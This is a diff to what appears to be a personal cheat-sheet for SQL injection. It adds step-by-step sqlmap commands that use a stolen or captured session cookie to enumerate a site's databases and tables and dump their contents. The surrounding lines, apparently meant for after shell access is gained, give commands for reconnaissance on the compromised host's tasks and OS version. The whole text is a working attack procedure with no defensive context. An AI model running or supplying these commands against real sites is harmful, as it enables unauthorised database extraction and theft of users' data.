@@ -9,3 +9,10 @@ sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that yo
 6.1 In the shell type-   TASKLIST  (to view the tasks)
 6.2 Use systeminfo for windows to get all os version
 6.3 Use uname -a for linux to get os version
+
+SQL CMD:
+login and view profile 
+inspect document.cookie
+sqlmap -u "URL" --cookie="cooke value" --dbs
+sqlmap -u "URL" --cookie="cooke value" -D databasename --tables
+sqlmap -u "URL" --cookie="cooke value" -D databasename -T table name --dump
